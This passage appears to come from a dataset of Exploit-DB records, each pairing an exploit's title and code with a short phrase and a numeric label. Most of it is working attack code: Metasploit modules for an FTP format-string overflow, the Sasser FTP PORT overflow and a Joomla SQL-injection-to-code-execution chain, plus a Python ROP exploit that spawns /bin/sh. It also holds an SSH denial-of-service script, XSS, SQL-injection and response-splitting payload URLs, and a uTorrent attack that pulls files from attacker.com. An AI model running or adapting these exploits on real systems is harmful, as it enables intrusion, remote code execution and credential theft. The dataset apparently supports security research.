0x77BBF102, # xchg eax,ebx ; add [eax],al ; retn 				0x77bbfc02, # pop ecx ; retn 				0x77bef001, # ptr that is w+ 				0x77bd8c04, # pop edi ; retn 				0x77bd8c05, # retn 				0x77be3adb, # pop eax ; retn 				0xFFFFFFC0, # flNewProtect 				0x77BAD64D, # neg eax ; pop ebp ; retn 				0x77be2265, # ptr to 'push esp ; ret' 				0x77BB8285, # xchg eax,edx ; retn 				0x77be3adb, # pop eax ; retn 				0x90909090, # nops 				0x77be6591, # pushad ; add al,0ef ; retn 			].pack(""V*"")  		elsif target.name =~ /XP SP3/ 			# C:\WINDOWS\system32\msvcrt.dll v7.0.2600.5512 			rop = [ 				0x77C21D16, # pop eax ; retn 				0x77C11120, # <- *&VirtualProtect() 				0x77C2E493, # mov eax,[eax] ; pop ebp ; retn 				junk, 				0x77C21891, # pop esi ; retn 				0x77C5D010, # ptr that is w+ 				0x77C2DD6C, # xchg eax,esi ; add [eax],al; retn 				0x77C21D16, # pop eax ; retn 				0xFFFFFBFF, # dwSize 				0x77C1BE18, # neg eax ; pop ebp ; retn 				junk, 				0x77C2362C, # pop ebx ; retn 				0x77C5D010, # ptr that is w+ 				0x77C2E071, # xchg eax,ebx ; add [eax],al ; retn 				0x77C1F519, # pop ecx ; retn 				0x77C5D010, # ptr that is w+ 				0x77C23B47, # pop edi ; retn 				0x77C23B48, # retn 				0x77C21D16, # pop eax ; retn 				0xFFFFFFC0, # flNewProtect 				0x77C1BE18, # neg eax ; pop ebp ; retn 				0x77C35459, # ptr to 'push esp ; ret' 				0x77C58FBC, # xchg eax,edx ; retn 				0x77C21D16, # pop eax ; retn 				0x90909090, # nops 				0x77C567F0, # pushad ; add al,0ef ; retn 			].pack(""V*"") 		end  		stage1 = %Q{ 			mov eax, #{target['Functionpointer']} 			mov ecx, #{target['Functionaddress']} 			mov [eax], ecx 		}  		offset_wp = rand_text_alphanumeric(1) 		pivot     = target['Pivot'] 		offset    = target['Pad'] + rop.length + stage1.length + payload.encoded.length  		attackstring  = rand_text_alphanumeric(7) 		attackstring << [target['Functionpointer']].pack('V') 		attackstring << ""%#{pivot}x""                          # special pointer to our pivot 		attackstring << ""%p"" * 208 + ""#{offset_wp }%n""        # format specifiers to read and write the function pointer 		attackstring << rand_text_alphanumeric(target['Pad']) 		attackstring << rop 		attackstring << Metasm::Shellcode.assemble(Metasm::Ia32.new, stage1).encode_string 		attackstring << payload.encoded 		attackstring << rand_text_alphanumeric(2000 - offset) 		attackstring << ""\r\n""  		sploit = ""USER #{attackstring}\r\n""  		print_status(""Triggering overflow..."") 		connect 		sock.get_once(1024) 		sock.put(sploit) 		select(nil, nil, nil, 2) 		handler 		disconnect  	end  end",sending a specially crafted format string specifier as a username,1
44426,"PMS 0.42 - Local Stack-Based Overflow (ROP) # Exploit Author: Juan Sacco <jsacco@exploitpack.com> - http://exploitpack.com # # Tested on: Kali i686 GNU/Linux # # Description: PMS 0.42 is prone to a local unauthenticated stack-based overflow # The vulnerability is due to an unproper filter of user supplied input while reading # the configuration file and parsing the malicious crafted values. # # 0004| 0xbfffe6c4 --> 0x445b91 ("": could not open file.\n"") # 0008| 0xbfffe6c8 --> 0xbfffe720 (""Didn't find configuration file "", 'A' <repeats 169 times>...) # 0012| 0xbfffe6cc --> 0xbfffe6f8 --> 0x736e6f00 ('') # # Program: PMS 0.42 Practical Music Search, an MPD client # PMS is an ncurses based client for Music Player Daemon. # Vendor homepage: https://pms.sourceforge.net # Kali Filename: pool/main/p/pms/pms_0.42-1+b2_i386.deb # # CANARY    : disabled # FORTIFY   : disabled # NX        : ENABLED # PIE       : disabled # RELRO     : Partial # #0000| 0xbfffe6c0 --> 0x4592a0 --> 0x45f870 --> 0x4 #0004| 0xbfffe6c4 --> 0x445b91 ("": could not open file.\n"") #0008| 0xbfffe6c8 --> 0xbfffe720 (""Didn't find configuration file "", 'A' <repeats 169 times>...) #0012| 0xbfffe6cc --> 0xbfffe6f8 --> 0x736e6f00 ('') #0016| 0xbfffe6d0 --> 0x4637ef (""german"") #0020| 0xbfffe6d4 --> 0x4637f6 (""de_DE.ISO-8859-1"") #0024| 0xbfffe6d8 --> 0x46adb0 (""AAAA\240\312F"") #0028| 0xbfffe6dc (""2018-04-04 06:57:58"") #Legend: code, data, rodata, value #Stopped reason: SIGSEGV #0x0042f6c6 in Pms::log (this=<optimized out>, verbosity=<optimized out>, code=0x41414141, format=<optimized out>) at src/pms.cpp:982 #982 if (!disp && verbosity < MSG_DEBUG) #gdb-peda$ backtrace #0  0x0042f6c6 in Pms::log (this=<optimized out>, verbosity=<optimized out>, code=0x41414141, format=<optimized out>) at src/pms.cpp:982 #1  0x41414141 in ?? ()  import os, subprocess from struct import pack  # rop execve ( bin/sh ) rop = ""A""*1017 # junk rop += pack('<I', 0x080e9101) # pop edx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret rop += pack('<I', 0x0811abe0) # @ .data rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x0807b744) # pop eax ; ret rop += '/bin' rop += pack('<I', 0x0810ae08) # mov dword ptr [edx], eax ; pop ebx ; pop ebp ; ret rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x080e9101) # pop edx ; pop ebx ; pop esi ; popedi ; pop ebp ; ret rop += pack('<I', 0x0811abe4) # @ .data + 4 rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x0807b744) # pop eax ; ret rop += '//sh' rop += pack('<I', 0x0810ae08) # mov dword ptr [edx], eax ; pop ebx ; pop ebp ; ret rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x080e9101) # pop edx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret rop += pack('<I', 0x0811abe8) # @ .data + 8 rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x080b4970) # xor eax, eax ; pop esi ; pop ebp ; ret rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x0810ae08) # mov dword ptr [edx], eax ; pop ebx ; pop ebp ; ret rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x080dcf4b) # pop ebx ; pop esi ; pop edi ; ret rop += pack('<I', 0x0811abe0) # @ .data rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x08067b43) # pop ecx ; ret rop += pack('<I', 0x0811abe8) # @ .data + 8 rop += pack('<I', 0x080e9101) # pop edx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret rop += pack('<I', 0x0811abe8) # @ .data + 8 rop += pack('<I', 0x0811abe0) # padding without overwrite ebx rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x080b4970) # xor eax, eax ; pop esi ; pop ebp ; ret rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080c861f) # int 0x80  try:    print(""[*] PMS 0.42 Buffer Overflow by Juan Sacco"")    print(""[*] Please wait.. running"")    subprocess.call([""pms -c"", rop]) except OSError as e:    if e.errno == os.errno.ENOENT:        print ""PMS  not found!""    else:     print ""Error executing exploit""    raise",the malicious crafted values,1
24422,"Comersus Cart 5.0 - HTTP Response Splitting source: https://www.securityfocus.com/bid/11083/info  Comersus Cart is reported prone to a HTTP response splitting vulnerability. A remote attacker may exploit this vulnerability to influence or misrepresent how web content is served, cached or interpreted. This could aid in various attacks, which try to entice client users into a false sense of trust.  This issue was identified in Comersus Shopping Cart 5.0991, however, other versions may be affected as well.   http://www.example.com/path_to_comersus/comersus_customerLoggedVerify.asp?  redirecturl=%0d%0a%0d%0aHTTP/1.0%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-L  ength:%2028%0d%0a%0d%0a{html}0wned%20by%20me{/html}",HTTP,0
19892,"Ethereal 0.8.4/0.8.5/0.8.6 / tcpdump 3.4/3.5 alpha - DNS Decode (2) source: https://www.securityfocus.com/bid/1165/info   A vulnerability exists in the DNS decode capabilities provided as part of the tcpdump sniffer, from LBL, as well as other sniffers, including Ethereal, by Gerald Combs. These sniffers will attempt to decode DNS request and queries. However, due to the DNS name compression scheme, it is possible to create a DNS packet such that tcpdump will be caught in an infinite loop, while trying to decompress. This will prevent the sniffer from displaying further packets. If tcpdump is being used as some part of and intrusion detection system, this could allow an intruder to evade this system.   When tcpdump is logging to a file, it is not affected by this vulnerability. Upon reading from a file which contains recorded packets, it will enter an infinite loop when it encounters packets of this type.  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/19892.tar.gz",create a DNS packet,1
25097,Brooky CubeCart 2.0.1/2.0.4 - 'index.php?language' Cross-Site Scripting source: https://www.securityfocus.com/bid/12549/info  Brooky CubeCart is reported prone to multiple vulnerabilities. These issues result from insufficient sanitization of user-supplied data and may allow remote attackers to disclose arbitrary files and carry out cross-site scripting attacks.  The application is reportedly susceptible to a remote directory traversal vulnerability. A malicious user could issue a request containing directory traversal strings such as '../' to possibly view files outside the server root directory in the context of the server.  The application is also prone to a cross-site scripting vulnerability. This issue is due to a failure of the application to properly sanitize user-supplied URI input. This may allow for theft of cookie-based authentication credentials or other attacks.  CubeCart 2.0.4 and prior versions are considered to be vulnerable to these issues.   http://www.example.com/index.php?&language=<script>var%20test_variable=31 337;alert(test_variable);</script>,directory traversal,1
21073,"Jakarta Tomcat 3.x/4.0 - Error Message Information Disclosure source: https://www.securityfocus.com/bid/3199/info  When a malformed request is made for a Java Server Page the server displays an error page. The error page contains potentially sensitive information, along with the absolute path of the JSP file on the webserver, which may aid in further attacks.  Jakarta Tomcat can be configured to display an alternate error file. By default it is not.   http://webserver.com/\java.jsp",a malformed request is made for a Java Server Page,1
21924,"SurfControl SuperScout Email Filter 3.5 - 'MsgError.asp' Cross-Site Scripting source: https://www.securityfocus.com/bid/5928/info  SurfControl SuperScout Email Filter comes with a web-based interface to provide remote access to administrative facilities.  The web-based admin interface is prone to cross-site scripting attacks.  It is possible to create a link containing malicious HTML and script code to certain pages in the interface. When this link is visited by a web user, the attacker-supplied script code will execute in user's web client in the security context of the web interface.  This may potentially be exploited to steal cookie-based authentication credentials from legitimate users of the interface.  http://www.example.com/web/msgError.asp?Redirect=loginhtm&Reason=<script>alert(document.cookie);</script>",create a link containing malicious HTML and script code to certain pages in the interface,1
32491,"Hummingbird HostExplorer 6.2/8.0 - ActiveX Control 'PlainTextPassword()' Remote Buffer Overflow source: https://www.securityfocus.com/bid/31783/info  Hummingbird HostExplorer ActiveX control is prone to a buffer-overflow vulnerability because the application fails to adequately check boundaries on user-supplied input.  An attacker can exploit this issue to execute arbitrary code in the context of the application using the ActiveX control (typically Internet Explorer). Failed attacks will likely cause denial-of-service conditions.   <html> <!-- the latest version of this activex (13.0) is compiled with /gs, earlier versions aren't. The XXXX would have overwritten return address. by thomas.pollet@gmail.com --> <object classid='clsid:FFB6CC68-702D-4FE2-A8E7-4DE23835F0D2' id='target' ></object> <script language='vbscript'> arg1=""001101220123012401250126012701280129012:012;012<012=012>012?012@012A012B012C012D012E012FXXXX"" target.PlainTextPassword = arg1 </script> </html>",the ActiveX control,1
48121,"Go SSH servers 0.0.2 - Denial of Service (PoC) # Exploit Title: Go SSH servers 0.0.2 - Denial of Service (PoC) # Author: Mark Adams # Date: 2020-02-21 # Link: https://github.com/mark-adams/exploits/blob/master/CVE-2020-9283/poc.py # CVE: CVE-2020-9283 # # Running this script may crash the remote SSH server if it is vulnerable. # The GitHub repository contains a vulnerable and fixed SSH server for testing. # # $ python poc.py # ./poc.py <host> <port> <user> # # $ python poc.py localhost 2022 root # Malformed auth request sent. This should cause a panic on the remote server. #  #!/usr/bin/env python  import socket import sys  import paramiko from paramiko.common import cMSG_SERVICE_REQUEST, cMSG_USERAUTH_REQUEST  if len(sys.argv) != 4:     print('./poc.py <host> <port> <user>')     sys.exit(1)  host = sys.argv[1] port = int(sys.argv[2]) user = sys.argv[3]  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((host, port))  t = paramiko.Transport(sock) t.start_client()  t.lock.acquire() m = paramiko.Message() m.add_byte(cMSG_SERVICE_REQUEST) m.add_string(""ssh-userauth"") t._send_message(m)  m = paramiko.Message() m.add_byte(cMSG_USERAUTH_REQUEST) m.add_string(user) m.add_string(""ssh-connection"") m.add_string('publickey') m.add_boolean(True) m.add_string('ssh-ed25519')  # Send an SSH key that is too short (ed25519 keys are 32 bytes) m.add_string(b'\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x15key-that-is-too-short')  # Send an empty signature (the server won't get far enough to validate it) m.add_string(b'\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x00')  t._send_message(m)  print('Malformed auth request sent. This should cause a panic on the remote server.')",Malformed auth request sent,1
44144,"October CMS < 1.0.431 - Cross-Site Scripting ​​# Exploit Title: October CMS Stored Code Injection # Date: 16-02-2018 # Exploit Author: Samrat Das # Contact: http://twitter.com/Samrat_Das93 # Website: https://securitywarrior9.blogspot.in/ # Vendor Homepage: *https://octobercms.com/ <https://octobercms.com/>* # Version: All versions till date from 1.0.431 # CVE : CVE- 2018-7198 # Category: WebApp CMS  1. Description  The application source code is coded in a way which allows malicious crafted HTML commands to be executed without input validation  2. Proof of Concept  1.  Visit the application 2.  Visit the Add posts page 3.  Goto edit function, add any html based payload and its gets stored and executed subsequently.  Proof of Concept  Steps to Reproduce:  1. Create any HTML based payload such as:  Username:<input type=text> <br> Password: <input type=text> <br> <button type=""button"">Login</button>  2. This hosted page with form action implemented upon clicked by user will lead to exfiltration of credentials apart from performing a host of other actions such as stored xss and another similiar attacks.    3. Solution:  Implement through input validation to reject unsafe html input.",malicious crafted HTML commands to be executed without input validation 2,1
25769,"Qualiteam X-Cart 4.0.8 - 'error_message.php?id' SQL Injection source: https://www.securityfocus.com/bid/13817/info            X-Cart is prone to SQL injection and cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.            These vulnerabilities could permit remote attackers to pass malicious input to database queries, resulting in modification of query logic or other attacks. Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation. An attacker may also steal cookie-based authentication credentials and carry out other attacks.            X-Cart 4.0.8 is reportedly vulnerable. Other versions may be affected as well.  http://www.example.com/error_message.php?access_denied&id='[SQL-inj]",malicious input,1
20558,"Apache 1.2 - Denial of Service source: https://www.securityfocus.com/bid/2216/info  Apache Web Server 1.2 and previous versions are subject to a denial of service. By requesting a malformed GET request composed of an unusually large number of '/' characters, an attacker can cause CPU usage to spike. A restart of the service is required to gain normal functionality.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/20558.zip",requesting a malformed GET request composed of an unusually large number of '/' characters,1
21196,"AOL Instant Messenger 4.x - Remote Buffer Overflow source: https://www.securityfocus.com/bid/3769/info  AOL Instant Messenger (AIM) is a real time messaging service.  The vulnerability exists in the way that AIM parses a game request with a TLV (type, length, value) type of 0x2711. This type of game request is prone to a buffer overflow which could allow a remote user to obtain the same privileges of the user who is currently logged on.  It is important to note that there is currently no way for an AIM user to block this type of request.  **AOL has made modifications to their AIM servers to prevent this vulnerability from being exploited through their servers. However, the underlying problem still exists in the client software which could still be exploited using something similar to a man in the middle attack or if an attacker can bypass the filters on the AIM servers.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/21196.tgz",a specially crafted script,1
16727,"Sasser Worm avserve - FTP PORT Buffer Overflow (Metasploit) ## # $Id: sasser_ftpd_port.rb 9179 2010-04-30 08:40:19Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = AverageRanking  	include Msf::Exploit::Remote::Ftp  	def initialize(info = {}) 		super(update_info(info, 			'Name'		=> 'Sasser Worm avserve FTP PORT Buffer Overflow', 			'Description'	=> %q{ 					This module exploits the FTP server component of the Sasser worm. 				By sending an overly long PORT command the stack can be overwritten. 			}, 			'Author'	=> [ 'valsmith [at] metasploit.com>', 'chamuco [at] gmail.com>', 'patrick' ], 			'Arch'		=> [ ARCH_X86 ], 			'License'	=> MSF_LICENSE, 			'Version'	=> '$Revision: 9179 $', 			'References'	=> 				[ 					[ 'OSVDB', '6197'], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'thread', 				}, 			'Platform' 	=> ['win'], 			'Privileged'	=> false, 			'Payload'	=> 				{ 					'Space'			=> 480, 					'BadChars'		=> ""\x00~+&=%\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e"", 					'StackAdjustment'	=> -3500, 				}, 			'Targets' 	=> 			[ 				[ 'Windows XP SP0', { 'Ret' => 0x71aa32ad } ], #p/p/r ws2help.dll 				[ 'Windows XP SP1', { 'Ret' => 0x77e7633a } ], #p/p/r 			], 			'DisclosureDate' => 'May 10 2004', 			'DefaultTarget' => 1))  		register_options( 			[ 				Opt::RPORT(5554), 			], self.class) 	end  	def exploit 		connect  		print_status(""Trying target #{target.name}..."")  		sploit = make_nops(267) + Rex::Arch::X86.jmp_short(6) + make_nops(2) + [target['Ret']].pack('V') 		sploit << Rex::Arch::X86.jmp(0xfffffc13) + make_nops(15) + payload.encoded + make_nops(1530)  		send_cmd( ['PORT', sploit] , false)  		handler 		disconnect 	end  end",sending an overly long PORT command,1
44151,"μTorrent (uTorrent) Classic/Web - JSON-RPC Remote Code Execution / Information Disclosure By default, utorrent create an HTTP RPC server on port 10000 (uTorrent classic) or 19575 (uTorrent web). There are numerous problems with these RPC servers that can be exploited by any website using XMLHTTPRequest(). To be clear, visiting *any* website is enough to compromise these applications.   uTorrent web (http://web.utorrent.com) ======================================  As the name suggests, uTorrent Web uses a web interface and is controlled by a browser as opposed to the desktop application. By default, uTorrent web is configured to startup with Windows, so will always be running and accessible. For authentication, a random token is generated and stored in a configuration file which must be passed as a URL parameter with all requests. When you click the uTorrent tray icon, a browser window is opened with the authentication token populated, it looks like this:  http://127.0.0.1:19575/gui/index.html?localauth=localapic3cfe21229a80938:  While not a particularly strong secret (8 bytes of std::random_device), it at least would make remote attacks non-trivial. Unfortunately however, the authentication secret is stored inside the webroot (wtf!?!?!?!), so you can just fetch the secret and gain complete control of the service.  $ curl -si http://localhost:19575/users.conf HTTP/1.1 200 OK Date: Wed, 31 Jan 2018 19:46:44 GMT Last-Modified: Wed, 31 Jan 2018 19:37:50 GMT Etag: ""5a721b0e.92"" Content-Type: text/plain Content-Length: 92 Connection: close Accept-Ranges: bytes  localapi29c802274dc61fb4        bc676961df0f684b13adae450a57a91cd3d92c03        94bc897965398c8a07ff    2       1  This requires some simple dns rebinding to attack remotely, but once you have the secret you can just change the directory torrents are saved to, and then download any file anywhere writable. For example:  # change the download directory to the Startup folder. http://127.0.0.1:19575/gui/?localauth=token:&action=setsetting&s=dir_active_download&v=C:/Users/All%20Users/Start%20Menu/Programs/Startup  # download a torrent containing calc.exe http://127.0.0.1:19575/gui/?localauth=token:&action=add-url&url=http://attacker.com/calc.exe.torrent  I wrote a working exploit for this attack, available here:  http://lock.cmpxchg8b.com/Moer0kae.html  The authentication secret is not the only data accessible within the webroot - settings, crashdumps, logs and other data is also accessible. As this is a complete remote compromise of the default uTorrent web configuration, I didn't bother looking any further after finding this.  uTorrent Classic (https://www.utorrent.com/downloads/win) =========================================================  By default utorrent Classic creates a JSON RPC server on port 10000, it's not clear to me that this was intentionally exposed to the web, as many endpoints crash or interfere with the UI. Here are some example actions that websites can take:  http://lock.cmpxchg8b.com/utorrent-crash-test.html  Nevertheless, browsing through the available endpoints I noticed that the /proxy/ handler is enabled and exposed by default, and allows any website to enumerate and copy any files you've downloaded. To be clear, any website you visit can read and copy every torrent you've downloaded. This works with the default configuration.  This requires brute forcing the ""sid"" which is a small integer that is incremented once for each torrent, this can be brute forced in seconds.  e.g.  $ curl -sI 'http://localhost:10000/proxy/0/?sid=2&file=0&callback=file' HTTP/1.1 200 OK Content-Type: audio/mpeg Server: BitTorrentProxy/1.0 Connection: close Accept-Ranges: bytes ETag: ""8FD54C339FE8B8A418CE2299AF2EADD9B1715D7A""  file is the index in a multi-file torrent (here there is just one file) and callback is a javascript callback. This means any website can find out what you've downloaded, and then just copy it from you - all the data.  I made a simple demo, screenshot of how it's supposed to look attached. It's really slow, but demonstrates that a website can enumerate and read any data you've downloaded via uTorrent.   http://lock.cmpxchg8b.com/Ahg8Aesh.html  Here is how I reproduced:  * On a fresh Windows 7 VM, install utorrent 3.5 (44294). Accept all default settings. * File -> Add torrent from URL..., enter https://archive.org/download/SKODAOCTAVIA336x280/SKODAOCTAVIA336x280_archive.torrent * When the torrent is finished (it's only about 5MB), visit this URL in Chrome: http://lock.cmpxchg8b.com/Ahg8Aesh.html * Click ""Start Attack"" * Wait a few minutes.  The page should have figured out the size and file type, and gives an option to steal the files. See screenshot attached.  ----------  The utorrent binary disables ASLR and /GS. This is a really bad idea. (Note that the binary is UPX packed, but this doesn't change any security properties).  ----------  I noticed that utorrent is using unmodified mersenne twister to generate authentication tokens and cookies, session identifiers, pairing keys, and so on. The PRNG is seeded with GetProcessId(), GetTickCount() etc. That is already not great quality seed data, but mersenne twister makes no guarantees that someone who can view sample output can't reconstruct the state of the PRNG.  This is actually one of the FAQs on the mersenne twister site:  http://www.math.sci.hiroshima-u.ac.jp/~m-mat/MT/efaq.html  This allows anyone to reconstruct things like pairing keys, webui session cookies, etc, etc. You can sample unlimited prng output, so this is a serious design flaw.  ----------  Finally, a minor issue - the documentation for the ""guest"" account feature says many actions are disabled for security, but I tested it and that it plain isn't true:  $ curl -si 'http://guest@localhost:10000/gui/?action=getsettings&callback=error&btapp=' HTTP/1.1 200 OK Connection: keep-alive Content-Length: 16572 Content-Type: text/javascript Set-Cookie: GUID=6yY1pkIHHMvvHo8tgOYu; path=/ Cache-Control: no-cache  {""build"":44090,""settings"": [ [""install_modification_time"",0,""0"",{""access"":""Y""}] ...   Perhaps this got broken at some point, but this feature is web-accessible, so this should probably be fixed (or suitable warnings added). I can't imagine many users enabled this, but those that did probably expected the security boundaries described in the documentation to be enforced.",a specially crafted webpage,1
38797,"Joomla! 3.4.4 Component Content History - SQL Injection / Remote Code Execution (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::FileDropper    def initialize(info={})     super(update_info(info,       'Name'           => ""Joomla Content History SQLi Remote Code Execution"",       'Description'    => %q{         This module exploits a SQL injection vulnerability found in Joomla versions         3.2 up to 3.4.4. The vulnerability exists in the Content History administrator         component in the core of Joomla. Triggering the SQL injection makes it possible         to retrieve active Super User sessions. The cookie can be used to login to the         Joomla administrator backend. By creating a new template file containing our         payload, remote code execution is made possible.       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'Asaf Orpani', # Vulnerability discovery           'xistence <xistence[at]0x90.nl>' # Metasploit module         ],       'References'     =>         [           [ 'CVE', '2015-7857' ], # Admin session hijacking           [ 'CVE', '2015-7297' ], # SQLi           [ 'CVE', '2015-7857' ], # SQLi           [ 'CVE', '2015-7858' ], # SQLi           [ 'URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/' ],           [ 'URL', 'http://developer.joomla.org/security-centre/628-20151001-core-sql-injection.html' ]         ],       'Payload'        =>         {           'DisableNops' => true,           # Arbitrary big number. The payload gets sent as POST data, so           # really it's unlimited           'Space'       => 262144, # 256k         },       'Platform'       => ['php'],       'Arch'           => ARCH_PHP,       'Targets'        =>         [           [ 'Joomla 3.x <= 3.4.4', {} ]         ],       'Privileged'     => false,       'DisclosureDate' => ""Oct 23 2015"",       'DefaultTarget'  => 0))        register_options(         [           OptString.new('TARGETURI', [true, 'The base path to Joomla', '/'])         ], self.class)    end    def check      # Request using a non-existing table     res = sqli(rand_text_alphanumeric(rand(10)+6))      if res && res.body =~ /`(.*)_ucm_history`/       return Exploit::CheckCode::Vulnerable     end     return Exploit::CheckCode::Safe    end     def sqli( tableprefix )      # SQLi will only grab Super User sessions with a valid username and userid (else they are not logged in).     # The extra search for NOT LIKE '%IS NOT NULL%' is because of our SQL data that's inserted in the session cookie history.     # This way we make sure that's excluded and we only get real admin sessions.      sql = "" (select 1 FROM(select count(*),concat((select (select concat(session_id)) FROM #{tableprefix}session WHERE data LIKE '%Super User%' AND data NOT LIKE '%IS NOT NULL%' AND userid!='0' AND username IS NOT NULL LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)""      # Retrieve cookies     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""index.php""),       'vars_get' => {         'option' => 'com_contenthistory',         'view' => 'history',         'list[ordering]' => '',         'item_id' => '1',         'type_id' => '1',         'list[select]' => sql         }       })      return res    end     def exploit      # Request using a non-existing table first, to retrieve the table prefix     res = sqli(rand_text_alphanumeric(rand(10)+6))      if res && res.code == 500 && res.body =~ /`(.*)_ucm_history`/       table_prefix = $1       print_status(""#{peer} - Retrieved table prefix [ #{table_prefix} ]"")     else       fail_with(Failure::Unknown, ""#{peer} - Error retrieving table prefix"")     end      # Retrieve the admin session using our retrieved table prefix     res = sqli(""#{table_prefix}_"")      if res && res.code == 500 && res.body =~ /Duplicate entry &#039;([a-z0-9]+)&#039; for key/       auth_cookie_part = $1[0...-1]       print_status(""#{peer} - Retrieved admin cookie [ #{auth_cookie_part} ]"")     else       fail_with(Failure::Unknown, ""#{peer}: No logged-in admin user found!"")     end      # Retrieve cookies     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""administrator"", ""index.php"")     })      if res && res.code == 200 && res.get_cookies =~ /^([a-z0-9]+)=[a-z0-9]+;/       cookie_begin = $1       print_status(""#{peer} - Retrieved unauthenticated cookie [ #{cookie_begin} ]"")     else       fail_with(Failure::Unknown, ""#{peer} - Error retrieving unauthenticated cookie"")     end      # Modify cookie to authenticated admin     auth_cookie = cookie_begin     auth_cookie << ""=""     auth_cookie << auth_cookie_part     auth_cookie << "";""      # Authenticated session     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""administrator"", ""index.php""),       'cookie'  => auth_cookie       })      if res && res.code == 200 && res.body =~ /Administration - Control Panel/       print_status(""#{peer} - Successfully authenticated as Administrator"")     else       fail_with(Failure::Unknown, ""#{peer} - Session failure"")     end       # Retrieve template view     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.path, ""administrator"", ""index.php""),       'cookie'  => auth_cookie,       'vars_get' => {         'option' => 'com_templates',         'view' => 'templates'         }       })      # We try to retrieve and store the first template found     if res && res.code == 200 && res.body =~ /\/administrator\/index.php\?option=com_templates&view=template&id=([0-9]+)&file=([a-zA-Z0-9=]+)/       template_id = $1       file_id = $2     else       fail_with(Failure::Unknown, ""Unable to retrieve template"")     end      filename = rand_text_alphanumeric(rand(10)+6)      # Create file     print_status(""#{peer} - Creating file [ #{filename}.php ]"")     res = send_request_cgi({       'method'   => 'POST',       'uri'      => normalize_uri(target_uri.path, ""administrator"", ""index.php""),       'cookie'  => auth_cookie,       'vars_get' => {         'option' => 'com_templates',         'task' => 'template.createFile',         'id' => template_id,         'file' => file_id,         },       'vars_post' => {         'type' => 'php',         'name' => filename       }       })      # Grab token     if res && res.code == 303 && res.headers['Location']       location = res.headers['Location']       print_status(""#{peer} - Following redirect to [ #{location} ]"")       res = send_request_cgi(         'uri'    => location,         'method' => 'GET',         'cookie' => auth_cookie       )        # Retrieving template token       if res && res.code == 200 && res.body =~ /&([a-z0-9]+)=1\"">/         token = $1         print_status(""#{peer} - Token [ #{token} ] retrieved"")       else         fail_with(Failure::Unknown, ""#{peer} - Retrieving token failed"")       end        if res && res.code == 200 && res.body =~ /(\/templates\/.*\/)template_preview.png/         template_path = $1         print_status(""#{peer} - Template path [ #{template_path} ] retrieved"")       else         fail_with(Failure::Unknown, ""#{peer} - Unable to retrieve template path"")       end      else       fail_with(Failure::Unknown, ""#{peer} - Creating file failed"")     end      filename_base64 = Rex::Text.encode_base64(""/#{filename}.php"")      # Inject payload data into file     print_status(""#{peer} - Insert payload into file [ #{filename}.php ]"")     res = send_request_cgi({       'method'   => 'POST',       'uri'      => normalize_uri(target_uri.path, ""administrator"", ""index.php""),       'cookie'  => auth_cookie,       'vars_get' => {         'option' => 'com_templates',         'view' => 'template',         'id' => template_id,         'file' => filename_base64,         },       'vars_post' => {         'jform[source]' => 